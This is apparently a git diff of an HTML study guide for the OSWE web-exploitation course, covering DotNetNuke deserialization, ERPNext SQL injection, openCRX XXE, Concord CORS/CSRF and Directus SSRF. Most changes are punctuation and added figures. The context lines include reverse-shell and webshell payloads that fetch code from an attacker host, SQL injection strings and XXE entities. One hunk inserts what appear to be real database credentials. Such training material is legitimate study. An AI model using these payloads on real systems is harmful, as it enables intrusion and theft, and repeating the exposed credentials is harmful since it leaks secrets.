         requests.post(url, json=payload, verify=False, timeout=5)
     except requests.exceptions.ReadTimeout:
-        pass  # Expected — shell hijacks the connection
+        pass  # Expected - shell hijacks the connection
     print("[*] Check listener for incoming connection")
 
 if __name__ == "__main__":
@@ -2482,7 +2484,7 @@ if __name__ == "__main__":
         if not args.check:
             reverse_shell(args.target, args.lhost, args.lport, args.batch, args.api)
     else:
-        print("[-] Aborting — target not vulnerable")</code></pre>
+        print("[-] Aborting - target not vulnerable")</code></pre>
 
 <pre><code class="language-bash"># Usage
 python3 bassmaster_exploit.py http://[target-ip]:[port] [attacker-ip] [listener-port]
@@ -2628,8 +2630,8 @@ namespace BasicXMLDeserializer
 <pre><code class="language-bash"># Run the serializer
 BasicXMLSerializer.exe "Hello AWAE"
 
-# Run the deserializer — setter fires automatically
-BasicXMLDeserializer.exe "C:\[writable-path]\[xml-file].txt"
+# Run the deserializer - setter fires automatically
+BasicXMLDeserializer.exe "C:\Users\Public\basicXML.txt"
 # Output: My first console text class says: Hello AWAE</code></pre>
 
 <h4 id="oswe-dnn-expanded-xml">6.1.3 Expanded XmlSerializer (Dynamic Type Resolution)</h4>
@@ -2683,7 +2685,7 @@ static void CustomDeserializer(String myXMLString)
 <h4 id="oswe-dnn-type-confusion">6.1.4 Type Confusion for Code Execution</h4>
 <p>When a deserializer namespace contains a class whose property setter executes code (like launching a process), an attacker can substitute that class in the XML. No type verification means arbitrary class instantiation is possible.</p>
 
-<pre><code class="language-csharp">// ExecCMD class — setter launches a process
+<pre><code class="language-csharp">// ExecCMD class - setter launches a process
 public class ExecCMD
 {
     private String _cmd;
@@ -2730,7 +2732,7 @@ csc.exe /r:BasicXMLSerializer.exe BasicXMLDeserializer.cs
 
 # Test: setter fires during deserialization
 BasicXMLSerializer.exe "Hello AWAE"
-BasicXMLDeserializer.exe "C:\[writable-path]\[xml-file].txt"</code></pre></li>
+BasicXMLDeserializer.exe "C:\Users\Public\basicXML.txt"</code></pre></li>
 <li><label><input type="checkbox"> Build the expanded serializer with dynamic type resolution and verify type substitution via <code>objectType</code> attribute</label></li>
 <li><label><input type="checkbox"> Build the <code>ExecCMD</code> class with a code-executing property setter and confirm <code>calc.exe</code> launches during deserialization</label></li>
 <li><label><input type="checkbox"> Verify that <code>XmlSerializer</code> only serializes public properties/fields and requires known types at instantiation time</label></li>
@@ -2741,6 +2743,7 @@ BasicXMLDeserializer.exe "C:\[writable-path]\[xml-file].txt"</code></pre></li>
 
 <h4 id="oswe-dnn-vuln-overview">6.2.1 Vulnerability Overview</h4>
 <p>The <code>DNNPersonalization</code> cookie contains XML-serialized user profile data. DotNetNuke deserializes this cookie without validating the object types, creating an insecure deserialization vulnerability (CVE-2017-9822) exploitable without authentication.</p>
+<figure><img src="./img/oswe/fig100-navigating-to-the-loadprofile-function.png" alt="Navigating to the LoadProfile function"></figure>
 
 <p>The entry point is the <code>LoadProfile</code> function in <code>DotNetNuke.Services.Personalization.PersonalizationController</code>. At line 24, it checks for the <code>DNNPersonalization</code> cookie. Line 26 assigns the cookie value to a local variable. Line 29 passes that value to <code>DeserializeHashTableXml</code>.</p>
 
@@ -2765,6 +2768,7 @@ BasicXMLDeserializer.exe "C:\[writable-path]\[xml-file].txt"</code></pre></li>
 
 <h4 id="oswe-dnn-debugging">6.2.4 Debugging Setup</h4>
 <p>Release-mode .NET assemblies apply runtime optimizations that prevent setting breakpoints at arbitrary lines. Modify the <code>[assembly: Debuggable]</code> attribute to disable optimizations before debugging.</p>
+<figure><img src="./img/oswe/fig111-setting-the-inital-breakpoint.png" alt="Setting the inital breakpoint"></figure>
 
 <pre><code class="language-csharp">// Change from (Release mode):
 [assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
@@ -2834,12 +2838,12 @@ myODP.MethodName = "PullFile";
 myODP.MethodParameters.Add("http://[attacker-ip]/shell.aspx");
 myODP.MethodParameters.Add("[web-root]/[webshell-name].aspx");</code></pre>
 
-<p><code>ObjectDataProvider</code> does not violate any <code>XmlSerializer</code> limitations — all the critical values (<code>ObjectInstance</code>, <code>MethodName</code>, <code>MethodParameters</code>) are public properties. The <code>InvokeMethodOnInstance</code> breakpoint is hit three times: once for <code>MethodName</code> and once for each <code>MethodParameters.Add</code> call.</p>
+<p><code>ObjectDataProvider</code> does not violate any <code>XmlSerializer</code> limitations - all the critical values (<code>ObjectInstance</code>, <code>MethodName</code>, <code>MethodParameters</code>) are public properties. The <code>InvokeMethodOnInstance</code> breakpoint is hit three times: once for <code>MethodName</code> and once for each <code>MethodParameters.Add</code> call.</p>
 
 <h4 id="oswe-dnn-serialization-problem">6.3.3 Serialization Problem</h4>
 <p>Directly serializing an <code>ObjectDataProvider</code> wrapping <code>FileSystemUtils</code> via DNN's <code>SerializeDictionary</code> function fails. The <code>XmlSerializer</code> is instantiated using <code>GetType()</code> on the <code>ObjectDataProvider</code>, so it has no knowledge of the wrapped <code>FileSystemUtils</code> type.</p>
 
-<pre><code class="language-csharp">// This fails — XmlSerializer doesn't expect FileSystemUtils inside ObjectDataProvider
+<pre><code class="language-csharp">// This fails - XmlSerializer doesn't expect FileSystemUtils inside ObjectDataProvider
 Hashtable table = new Hashtable();
 table["myTableEntry"] = myODP;
 String payload = XmlUtils.SerializeDictionary(table, "profile");
@@ -2848,7 +2852,7 @@ String payload = XmlUtils.SerializeDictionary(table, "profile");
 // Even explicitly adding the type won't help at deserialization time
 XmlSerializer xmlSerializer = new XmlSerializer(myODP.GetType(),
     new Type[] { typeof(FileSystemUtils) });
-// DNN's deserializer uses the default constructor — it won't know about FileSystemUtils</code></pre>
+// DNN's deserializer uses the default constructor - it won't know about FileSystemUtils</code></pre>
 
 <h4 id="oswe-dnn-expandedwrapper">6.3.4 ExpandedWrapper for Type Compatibility</h4>
 <p>The <code>ExpandedWrapper</code> class (<code>System.Data.Services.Internal</code>) is a generic container that specifies the types of encapsulated objects in its type parameters. This allows <code>XmlSerializer</code> to know about all involved types at serialization time.</p>
@@ -2951,7 +2955,7 @@ sudo cp /usr/share/webshells/aspx/[webshell-name].aspx /var/www/html/
 sudo chmod 644 /var/www/html/[webshell-name].aspx
 sudo systemctl start apache2</code></pre>
 
-<pre><code class="language-bash"># Send the payload — request a nonexistent page to trigger LoadProfile via 404 handler
+<pre><code class="language-bash"># Send the payload - request a nonexistent page to trigger LoadProfile via 404 handler
 curl -b "DNNPersonalization=[payload-xml]" http://[target-ip]/[application-path]/nonexistent.aspx
 
 # Verify: attacker web server log should show:
@@ -3038,7 +3042,7 @@ iconv -f ASCII -t UTF-16LE payload.txt | base64 | tr -d "\n"
 <h3 id="oswe-erpnext-overview">7.1 Overview</h3>
 <p>ERPNext is an open-source Enterprise Resource Planning application built on the <strong>Frappe</strong> web framework. Frappe is a Python-based framework that follows a metadata-driven design pattern using <strong>DocTypes</strong> as its core building blocks, each encompassing the Model (database table), View (form UI), and Controller (.py logic file).</p>
 
-<p>Frappe applies MVC at the DocType level — <strong>Controller</strong> handles routes, <strong>Model</strong> maps data to objects, <strong>View</strong> renders output — but deviates at lower levels. Vulnerabilities appear where developers bypass these patterns.</p>
+<p>Frappe applies MVC at the DocType level - <strong>Controller</strong> handles routes, <strong>Model</strong> maps data to objects, <strong>View</strong> renders output - but deviates at lower levels. Vulnerabilities appear where developers bypass these patterns.</p>
 
 <p>Frappe's metadata-driven architecture generates CRUD components from DocType definitions stored as JSON. The abstraction supports diverse industries, but the complexity introduces security risk where developers directly manipulate the model (SQL) or view (templates) outside the intended pattern.</p>
 
@@ -3081,8 +3085,8 @@ iconv -f ASCII -t UTF-16LE payload.txt | base64 | tr -d "\n"
 <p>Password reset exploitation requires the application to send emails. Configure Frappe to route emails through the attacker's SMTP server by editing the site configuration file on the ERPNext server.</p>
 
 <pre><code class="language-json">{
- "db_name": "[database-name]",
- "db_password": "[database-password]",
+ "db_name": "_1bd3e0294da19198",
+ "db_password": "32ldabYvxQanK4jj",
  "db_type": "mariadb",
  "mail_server": "[attacker-ip]",
  "use_ssl": 0,
@@ -3196,6 +3200,8 @@ sudo tail -f /var/log/mysql/mysql.log</code></pre>
 
 <h3 id="oswe-erpnext-frappe-routing">7.3 Frappe Framework HTTP Routing</h3>
 <p>Frappe exposes Python functions as HTTP API endpoints using the <code>@frappe.whitelist()</code> decorator. The client calls functions via <code>/api/method/[dotted.path.to.function]</code>, and Frappe maps the dotted path directly to the filesystem to locate and execute the function. Functions decorated with <code>allow_guest=True</code> are accessible without authentication.</p>
+<figure><img src="./img/oswe/fig152-inputprocessouput-machine.png" alt="Input-Process-Ouput Machine"></figure>
+<figure><img src="./img/oswe/fig154-frappe-metadatadriven-model.png" alt="Frappe Metadata-Driven Model"></figure>
 
 <h4 id="oswe-erpnext-whitelist">7.3.1 The Whitelist Decorator</h4>
 <pre><code class="language-python"># apps/frappe/frappe/__init__.py - whitelist decorator
@@ -3523,10 +3529,14 @@ def reset_password(self, send_email=False, password_expired=False):
     <label><input type="checkbox"> Map response column positions: doctype=1, name=2, content=3, title=4, route=5</label>
   </li>
   <li>
-    <label><input type="checkbox"> Extract database version with <code>[scope-prefix]" UNION ALL SELECT 1,2,3,4,@@version#</code> to confirm injection</label>
+    <label><input type="checkbox"> Extract database version to confirm injection</label>
+    <pre><code class="language-sql">-- scope payload:
+-- [scope-prefix]" UNION ALL SELECT 1,2,3,4,@@version#</code></pre>
   </li>
   <li>
-    <label><input type="checkbox"> Resolve collation mismatch by extracting <code>COLLATION_NAME</code> from <code>information_schema.columns</code></label>
+    <label><input type="checkbox"> Resolve collation mismatch when extracting from other tables</label>
+    <pre><code class="language-sql">-- Extract collation:
+-- [scope-prefix]" UNION ALL SELECT 1,2,3,4,COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name"#</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Extract usernames from <code>__Auth</code> table with forced collation</label>
@@ -3853,7 +3863,7 @@ public void requestPasswordReset(UserHome userHome) throws ServiceException {
 }</code></pre>
 
 <h4 id="oswe-opencrx-random-base62">8.2.2 Vulnerable Token Generation</h4>
-<p>The <code>getRandomBase62</code> method in <code>org.opencrx.kernel.utils.Utils</code> uses <code>java.util.Random</code> seeded with the current time in milliseconds. This is not cryptographically secure — two <code>Random</code> objects with the same seed produce identical output sequences.</p>
+<p>The <code>getRandomBase62</code> method in <code>org.opencrx.kernel.utils.Utils</code> uses <code>java.util.Random</code> seeded with the current time in milliseconds. This is not cryptographically secure - two <code>Random</code> objects with the same seed produce identical output sequences.</p>
 
 <pre><code class="language-java">// org.opencrx.kernel.utils.Utils.java - vulnerable PRNG
 public static String getRandomBase62(int length) {
@@ -3868,13 +3878,13 @@ public static String getRandomBase62(int length) {
 }</code></pre>
 
 <h4 id="oswe-opencrx-random-vs-secure">8.2.3 java.util.Random vs SecureRandom</h4>
-<p>The Java standard library provides two primary random number generators. <code>java.util.Random</code> is a linear congruential generator (LCG) — identical seeds produce identical sequences. <code>java.security.SecureRandom</code> is cryptographically strong and produces non-deterministic output even with the same seed.</p>
+<p>The Java standard library provides two primary random number generators. <code>java.util.Random</code> is a linear congruential generator (LCG) - identical seeds produce identical sequences. <code>java.security.SecureRandom</code> is cryptographically strong and produces non-deterministic output even with the same seed.</p>
 
 <table class="custom-table">
 <thead><tr><th>Class</th><th>Type</th><th>Deterministic?</th><th>Use Case</th></tr></thead>
 <tbody>
-<tr><td><code>java.util.Random</code></td><td>LCG (pseudorandom)</td><td>Yes — same seed = same sequence</td><td>Non-security purposes only</td></tr>
-<tr><td><code>java.security.SecureRandom</code></td><td>CSPRNG</td><td>No — non-deterministic output</td><td>Security-sensitive applications</td></tr>
+<tr><td><code>java.util.Random</code></td><td>LCG (pseudorandom)</td><td>Yes - same seed = same sequence</td><td>Non-security purposes only</td></tr>
+<tr><td><code>java.security.SecureRandom</code></td><td>CSPRNG</td><td>No - non-deterministic output</td><td>Security-sensitive applications</td></tr>
 </tbody>
 </table>
 
@@ -3917,7 +3927,7 @@ No match.</code></pre>
 <tr><td>guest</td><td>guest</td><td>"Password reset request was successful"</td></tr>
 <tr><td>admin-Standard</td><td>admin-Standard</td><td>"Password reset request was successful"</td></tr>
 <tr><td>admin-Root</td><td>admin-Root</td><td>"Password reset request was successful"</td></tr>
-<tr><td>invaliduser</td><td>—</td><td>Error message (account not found)</td></tr>
+<tr><td>invaliduser</td><td>-</td><td>Error message (account not found)</td></tr>
 </tbody>
 </table>
 
@@ -4055,6 +4065,7 @@ wc -l tokens.txt</code></pre></li>
 
 <h3 id="oswe-opencrx-xxe">8.3 XML External Entity Injection</h3>
 <p>With authenticated access, the openCRX REST API becomes available. It accepts XML input via Swagger-documented endpoints, and if the XML parser is insecurely configured, XXE can read files from the server.</p>
+<figure><img src="./img/oswe/fig219-viewing-sample-models.png" alt="Viewing Sample Models"></figure>
 
 <h4 id="oswe-opencrx-xml-basics">8.3.1 XML Entity Basics</h4>
 <p>XML entities act as variables within XML documents, defined in Document Type Definitions (DTDs). They come in three forms: internal, external, and parameter entities.</p>
@@ -4093,6 +4104,7 @@ wc -l tokens.txt</code></pre></li>
   &lt;lastName&gt;&amp;lastname;&lt;/lastName&gt;
   &lt;firstName&gt;Tom&lt;/firstName&gt;
 &lt;/org.opencrx.kernel.account1.Contact&gt;</code></pre>
+<figure><img src="./img/oswe/fig220-sample-post-body.png" alt="Sample POST body"></figure>
 
 <p>The external entity read succeeds but causes an SQL INSERT error (<code>java.sql.SQLDataException: string data, right truncation</code>) because the file contents exceed the column size. The file contents are still visible in the verbose error response, including the full SQL statement with the parsed <code>/etc/passwd</code> data embedded.</p>
 
@@ -4113,6 +4125,7 @@ curl -X POST \
 
 <pre><code class="language-xml">&lt;!-- wrapper.dtd - host on attacker's web server --&gt;
 &lt;!ENTITY wrapper "%start;%file;%end;"&gt;</code></pre>
+<figure><img src="./img/oswe/fig223-using-xxe-to-read-tomcatusersxml.png" alt="Using XXE to read tomcat-users.xml"></figure>
 
 <pre><code class="language-bash"># Place wrapper.dtd in web root and start Apache
 sudo cp wrapper.dtd /var/www/html/
@@ -4136,6 +4149,7 @@ sudo systemctl start apache2</code></pre>
 
 <h4 id="oswe-opencrx-xxe-directory">8.3.4 Directory Enumeration via XXE</h4>
 <p>In Java, the <code>File</code> class can reference directories. Modifying the XXE payload to point at a directory returns a directory listing. Use this to enumerate the filesystem for credentials and configuration files.</p>
+<figure><img src="./img/oswe/fig224-access-denied.png" alt="Access Denied"></figure>
 
 <pre><code class="language-xml">&lt;!-- Read directory listing --&gt;
 &lt;!ENTITY % file SYSTEM "file:///home/[username]/crx/data/hsqldb/"&gt;</code></pre>
@@ -4159,7 +4173,7 @@ sudo cp wrapper.dtd /var/www/html/ && sudo systemctl start apache2</code></pre><
 </ul>
 
 <h3 id="oswe-opencrx-hsqldb">8.4 HSQLDB Access and RCE</h3>
-<p>Using the XXE directory enumeration, we discover HSQLDB database files and a <code>dbmanager.sh</code> script containing JDBC connection credentials. HSQLDB relies on ACLs or network-layer protections for access control — if the port is open and no ACLs are configured, we can connect remotely.</p>
+<p>Using the XXE directory enumeration, we discover HSQLDB database files and a <code>dbmanager.sh</code> script containing JDBC connection credentials. HSQLDB relies on ACLs or network-layer protections for access control - if the port is open and no ACLs are configured, we can connect remotely.</p>
 
 <h4 id="oswe-opencrx-hsqldb-creds">8.4.1 Discovering HSQLDB Credentials</h4>
 <p>The <code>dbmanager.sh</code> file (read via XXE with CDATA wrapping) reveals a JDBC connection string with username <code>[db-user]</code> and password <code>[db-password]</code>. The <code>crx.properties</code> file shows no ACLs are defined.</p>
@@ -4425,7 +4439,7 @@ gobuster dir -w ./npm-10000.txt -u https://[target-ip]/js/vendor/ -k</code></pre
 <h3 id="oswe-openitcockpit-dom-xss">9.3 DOM-Based XSS</h3>
 <p>The Document Object Model (DOM) is a hierarchical tree of objects representing HTML elements created by the browser's rendering engine. JavaScript manipulates the DOM via the <code>Document</code> interface using methods like <code>getElementById</code>, <code>getElementsByTagName</code>, and properties like <code>innerHTML</code>.</p>
 
-<p>DOM-based XSS occurs when unsanitized user input is passed to a DOM manipulation sink like <code>innerHTML</code> or <code>document.write()</code>. Unlike reflected or stored XSS, the payload never reaches the server — it is processed entirely in the client's browser.</p>
+<p>DOM-based XSS occurs when unsanitized user input is passed to a DOM manipulation sink like <code>innerHTML</code> or <code>document.write()</code>. Unlike reflected or stored XSS, the payload never reaches the server - it is processed entirely in the client's browser.</p>
 
 <pre><code class="language-javascript">// Example DOM XSS - user input flows directly into document.write()
 &lt;!DOCTYPE html&gt;
@@ -5004,7 +5018,7 @@ python3 wsclient.py --url wss://[target-ip]/sudo_server \
 # ERROR: Forbidden command!</code></pre>
 
 <h4 id="oswe-openitcockpit-command-fuzzing">9.5.3 Command Fuzzing and Injection</h4>
-<p>The server rejects most commands with "Forbidden command!" — only whitelisted commands are allowed. Fuzzing with a common command wordlist reveals that <code>ls</code> is permitted, and the listed scripts in the current directory (Nagios monitoring plugins) can also be executed.</p>
+<p>The server rejects most commands with "Forbidden command!" - only whitelisted commands are allowed. Fuzzing with a common command wordlist reveals that <code>ls</code> is permitted, and the listed scripts in the current directory (Nagios monitoring plugins) can also be executed.</p>
 
 <ul class="methodology-checklist">
   <li><label><input type="checkbox"> Fuzz for allowed commands (modify wsclient.py to iterate a wordlist)</label></li>
@@ -5057,7 +5071,7 @@ python3 wsclient.py --url wss://[target-ip]/sudo_server \
 
 <h4 id="oswe-openitcockpit-methodology">Methodology</h4>
 <ul class="methodology-checklist">
-  <li><label><input type="checkbox" data-id="oswe-9-0"> Build sitemap via Burp proxy — note vendor JS directories and extra files</label></li>
+  <li><label><input type="checkbox" data-id="oswe-9-0"> Build sitemap via Burp proxy - note vendor JS directories and extra files</label></li>
   <li><label><input type="checkbox" data-id="oswe-9-1"> Generate npm wordlist and brute-force <code>/js/vendor/</code> for additional packages</label>
     <pre><code class="language-bash">jq '.[0:10000]' names.json | grep "," | cut -d'"' -f 2 &gt; npm-10000.txt
 gobuster dir -w ./npm-10000.txt -u https://[target-ip]/js/vendor/ -k</code></pre>
@@ -5109,6 +5123,7 @@ https://[target-ip]/js/vendor/lodash/perf/index.html?build=https://[attacker-ip]
   <li><label><input type="checkbox"> Enumerate accessible routes with dirb or gobuster</label>
     <pre><code class="language-bash">dirb http://[target-ip]:[port]
 gobuster dir -u http://[target-ip]:[port] -w /usr/share/wordlists/dirb/common.txt</code></pre>
+<figure><img src="./img/oswe/fig246-burp-history-initial-navigation.png" alt="Burp History - Initial Navigation"></figure>
   </li>
   <li><label><input type="checkbox"> Review API documentation if /docs or /swagger endpoints are accessible</label>
     <pre><code class="language-bash">curl http://[target-ip]:[port]/docs
@@ -5128,13 +5143,14 @@ curl http://[target-ip]:[port]/swagger.json</code></pre>
 
 <h4 id="oswe-concord-initial-recon">10.2.1 Initial Reconnaissance</h4>
 <p>The Concord home page prompts for credentials and exposes few links. A <code>dirb</code> scan reveals the <code>/api</code>, <code>/forms</code>, and <code>/logs</code> routes all return 401 Unauthorized, while <code>/docs</code> hosts the application documentation.</p>
+<figure><img src="./img/oswe/fig262-login-request-and-response.png" alt="Login Request and Response"></figure>
 
 <pre><code class="language-bash">dirb http://concord:8001</code></pre>
 
 <p>Reviewing Burp Suite HTTP history shows the browser automatically issues a request to <code>/api/service/console/whoami</code> on page load. The response includes <code>Access-Control-*</code> headers, indicating CORS is configured on the application.</p>
 
 <h4 id="oswe-concord-sop">10.2.2 Same-Origin Policy (SOP)</h4>
-<p>Browsers enforce the Same-Origin Policy to prevent one origin from reading resources loaded from a different origin. An origin is defined by scheme, hostname, and port. SOP does not prevent a request from being <em>sent</em> — it prevents JavaScript from <em>reading</em> the response.</p>
+<p>Browsers enforce the Same-Origin Policy to prevent one origin from reading resources loaded from a different origin. An origin is defined by scheme, hostname, and port. SOP does not prevent a request from being <em>sent</em> - it prevents JavaScript from <em>reading</em> the response.</p>
 
 <table class="custom-table">
 <thead><tr><th>URL (from <code>https://a.com/latest</code>)</th><th>Result</th><th>Reason</th></tr></thead>
@@ -5149,12 +5165,12 @@ curl http://[target-ip]:[port]/swagger.json</code></pre>
 
 <p>JavaScript's <code>fetch()</code> API demonstrates this. A same-origin request succeeds and the response is readable, while a cross-origin request is sent but the browser blocks JavaScript from accessing the response body.</p>
 
-<pre><code class="language-javascript">// Same-origin request — response readable
+<pre><code class="language-javascript">// Same-origin request - response readable
 fetch("http://concord:8001/cfg.js")
     .then(function (response) { return response.text(); })
     .then(function (text) { console.log(text); })
 
-// Cross-origin request — blocked by SOP
+// Cross-origin request - blocked by SOP
 fetch("http://example.com")
     .then(function (response) { return response.text(); })
     .then(function (text) { console.log(text); })</code></pre>
@@ -5171,18 +5187,18 @@ fetch("http://example.com")
 </tbody>
 </table>
 
-<p>When <code>Access-Control-Allow-Origin</code> is set to <code>*</code>, <code>Access-Control-Allow-Credentials</code> must be <code>false</code>, so all cross-origin requests are unauthenticated. Because <code>Allow-Origin</code> only accepts a single value, developers often dynamically reflect the request's <code>Origin</code> header — a pattern that is inherently insecure when paired with <code>Allow-Credentials: true</code>.</p>
+<p>When <code>Access-Control-Allow-Origin</code> is set to <code>*</code>, <code>Access-Control-Allow-Credentials</code> must be <code>false</code>, so all cross-origin requests are unauthenticated. Because <code>Allow-Origin</code> only accepts a single value, developers often dynamically reflect the request's <code>Origin</code> header - a pattern that is inherently insecure when paired with <code>Allow-Credentials: true</code>.</p>
 
 <h4 id="oswe-concord-preflight">10.2.4 Preflight Requests</h4>
 <p>Standard GET, HEAD, and POST requests (with standard content types) do not require a preflight check. However, requests using non-standard HTTP methods, custom headers, or non-standard content types (anything other than <code>application/x-www-form-urlencoded</code>, <code>multipart/form-data</code>, or <code>text/plain</code>) trigger an OPTIONS preflight request. The server must respond with appropriate CORS headers for the actual request to proceed.</p>
 
-<pre><code class="language-javascript">// Standard POST — no preflight, request is sent
+<pre><code class="language-javascript">// Standard POST - no preflight, request is sent
 fetch("https://example.com", {
     method: 'post',
     headers: { "Content-type": "application/x-www-form-urlencoded;" }
 })
 
-// Non-standard content type — triggers OPTIONS preflight
+// Non-standard content type - triggers OPTIONS preflight
 fetch("https://example.com", {
     method: 'post',
     headers: { "Content-type": "application/json;" }
@@ -5195,7 +5211,7 @@ fetch("https://example.com", {
 <thead><tr><th>Value</th><th>Behavior</th></tr></thead>
 <tbody>
 <tr><td><strong>Strict</strong></td><td>Cookies only sent on same-site requests (not even on navigation links)</td></tr>
-<tr><td><strong>Lax</strong></td><td>Cookies sent on top-level navigation with safe methods (GET, HEAD, OPTIONS) — default in Chrome 80+ and Edge 86+</td></tr>
+<tr><td><strong>Lax</strong></td><td>Cookies sent on top-level navigation with safe methods (GET, HEAD, OPTIONS) - default in Chrome 80+ and Edge 86+</td></tr>
 <tr><td><strong>None</strong></td><td>Cookies sent in all contexts (requires the <code>Secure</code> attribute)</td></tr>
 </tbody>
 </table>
@@ -5220,14 +5236,14 @@ fetch("https://example.com", {
 <pre><code class="language-bash">curl -i -X OPTIONS -H "Origin: http://evil.com" \
   -H "Access-Control-Request-Method: POST" \
   http://[target-ip]:8001/api/service/console/whoami</code></pre></li>
-<li><label><input type="checkbox"> Inspect <code>Set-Cookie</code> headers for <code>SameSite</code> attribute — <code>None</code> or absent enables cross-site cookie inclusion</label></li>
+<li><label><input type="checkbox"> Inspect <code>Set-Cookie</code> headers for <code>SameSite</code> attribute - <code>None</code> or absent enables cross-site cookie inclusion</label></li>
 <li><label><input type="checkbox"> Check application documentation for API endpoints that perform privileged actions (user creation, key generation, command execution)</label></li>
 </ul>
 
 <h3 id="oswe-concord-exploit">10.3 Exploitation</h3>
 
 <h4 id="oswe-concord-csrf-exploit">10.3.1 Round One: CSRF via Permissive CORS</h4>
-<p>The Concord API documentation reveals a process execution endpoint at <code>POST /api/v1/process</code> that accepts <code>multipart/form-data</code> — a content type that does not require preflight. A <code>concord.yml</code> file defining a Groovy flow can execute arbitrary commands.</p>
+<p>The Concord API documentation reveals a process execution endpoint at <code>POST /api/v1/process</code> that accepts <code>multipart/form-data</code> - a content type that does not require preflight. A <code>concord.yml</code> file defining a Groovy flow can execute arbitrary commands.</p>
 
 <p>The attack requires hosting a malicious HTML page and luring an authenticated Concord user to visit it. The page first checks if the victim is logged in, then submits a process containing a reverse shell payload.</p>
 
@@ -5362,7 +5378,7 @@ grep -rl '&lt;insert tableName="API_KEYS"&gt;' ./
 
 <p>The earliest migration (<code>v0.0.1.xml</code>) creates the USERS table and inserts an API key with a commented "original" value. The hashed key stored in the database no longer matches, so this key fails authentication.</p>
 
-<pre><code class="language-xml">&lt;!-- v0.0.1.xml — changeset 1440 --&gt;
+<pre><code class="language-xml">&lt;!-- v0.0.1.xml - changeset 1440 --&gt;
 &lt;insert tableName="API_KEYS"&gt;
     &lt;column name="KEY_ID"&gt;d5165ca8-e8de-11e6-9bf5-136b5db23c32&lt;/column&gt;
     &lt;!-- original: auBy4eDWrKWsyhiDp3AQiw --&gt;
@@ -5372,7 +5388,7 @@ grep -rl '&lt;insert tableName="API_KEYS"&gt;' ./
 
 <p>A later migration (<code>v0.69.0.xml</code>) inserts a <code>concordAgent</code> user and a new API key. The commented plaintext value above the hashed key is the pre-hash secret.</p>
 
-<pre><code class="language-xml">&lt;!-- v0.69.0.xml — changeset 69000 --&gt;
+<pre><code class="language-xml">&lt;!-- v0.69.0.xml - changeset 69000 --&gt;
 &lt;property name="concordAgentUserId" value="d4f123c1-f8d4-40b2-8a12-b8947b9ce2d8"/&gt;
 
 &lt;changeSet id="69000" author="ybrigo@gmail.com"&gt;
@@ -5463,7 +5479,7 @@ print(f"[*] Process response: {r.text}")</code></pre>
   <li><label><input type="checkbox" data-id="oswe-10-0"> Enumerate application routes with dirb/gobuster</label>
     <pre><code class="language-bash">dirb http://concord:8001</code></pre>
   </li>
-  <li><label><input type="checkbox" data-id="oswe-10-1"> Inspect CORS headers on API endpoints — look for reflected Origin and <code>Allow-Credentials: true</code></label>
+  <li><label><input type="checkbox" data-id="oswe-10-1"> Inspect CORS headers on API endpoints - look for reflected Origin and <code>Allow-Credentials: true</code></label>
     <pre><code class="language-bash">curl -i -H "Origin: http://evil.com" http://concord:8001/api/service/console/whoami</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-10-2"> Check preflight (OPTIONS) response for differing CORS headers</label>
@@ -5495,6 +5511,7 @@ grep -rl '&lt;insert tableName="API_KEYS"&gt;' ./</code></pre>
 
 <h3 id="oswe-ssrf-overview">11.1 Overview</h3>
 <p>Server-Side Request Forgery (SSRF) occurs when an attacker forces a server-side application to make HTTP requests to an arbitrary destination. Since the request originates from the server, it can reach internal services, localhost-bound interfaces, and hosts behind firewalls or reverse proxies that the attacker cannot access directly.</p>
+<figure><img src="./img/oswe/fig273-example-api-call-to-best-buys-products-api.png" alt="Example API call to Best Buy’s Products API"></figure>
 
 <p>In this module we target Directus v9.0.0-rc34 running behind a Kong API Gateway 2.2.1. Using a blackbox methodology, we discover an unauthenticated blind SSRF in the Directus <code>/files/import</code> endpoint, chain it through a Headless Chrome render service, and ultimately achieve RCE on the Kong API Gateway container via the Serverless Functions plugin.</p>
 
@@ -5528,7 +5545,7 @@ docker network inspect [network-name]</code></pre></li>
 <h3 id="oswe-ssrf-microservices">11.2 Microservices Architecture</h3>
 <p>Modern applications decompose into smaller microservices, each exposing a single function via a RESTful API. The API gateway sits in front, handling authentication, rate limiting, and TLS termination before proxying requests to backend services.</p>
 
-<p>Microservices in Docker environments use container names as hostnames for internal DNS resolution. Because the gateway often handles security controls, backend services may lack their own authentication — so bypassing the gateway exposes internal APIs without credentials.</p>
+<p>Microservices in Docker environments use container names as hostnames for internal DNS resolution. Because the gateway often handles security controls, backend services may lack their own authentication - so bypassing the gateway exposes internal APIs without credentials.</p>
 
 <h4 id="oswe-ssrf-url-formats">11.2.1 RESTful URL Formats</h4>
 <p>API URLs follow varying patterns. Understanding these helps with enumeration and fuzzing when targeting unknown services.</p>
@@ -5554,7 +5571,7 @@ cat docker-compose.yml</code></pre></li>
 </ul>
 
 <h3 id="oswe-ssrf-discovery">11.3 API Discovery via Verb Tampering</h3>
-<p>RESTful APIs tie functionality to HTTP verbs — a GET may return data while a POST creates resources. Standard enumeration tools only send GET requests and can miss endpoints that respond differently to POST, PUT, or DELETE.</p>
+<p>RESTful APIs tie functionality to HTTP verbs - a GET may return data while a POST creates resources. Standard enumeration tools only send GET requests and can miss endpoints that respond differently to POST, PUT, or DELETE.</p>
 
 <h4 id="oswe-ssrf-initial-enum">11.3.1 Initial Enumeration</h4>
 <p>The Kong gateway returns a 404 with <code>{"message":"no Route matched with those values"}</code> for unknown paths. The Admin API on port 8001 is not externally accessible. We use gobuster with expanded status codes (including 405 and 500) to find valid routes.</p>
@@ -5639,14 +5656,15 @@ curl -i -X POST http://[target-ip]:8000/files/import
 <pre><code class="language-bash">curl -i http://[target-ip]:8000/files/import
 curl -i -X POST http://[target-ip]:8000/files/import</code></pre></li>
 <li><label><input type="checkbox"> Build a verb-tampering script that sends GET and POST to compound paths (<code>/endpoint/action</code>) and flags differing response codes</label></li>
-<li><label><input type="checkbox"> Inspect error messages for parameter hints (e.g., <code>"url" is required</code>) — any endpoint accepting a URL parameter is a SSRF candidate</label></li>
+<li><label><input type="checkbox"> Inspect error messages for parameter hints (e.g., <code>"url" is required</code>) - any endpoint accepting a URL parameter is a SSRF candidate</label></li>
 <li><label><input type="checkbox"> Check <code>X-Powered-By</code> and error response structure to fingerprint backend frameworks behind the gateway</label></li>
 </ul>
 
 <h3 id="oswe-ssrf-exploitation">11.4 SSRF Discovery and Exploitation</h3>
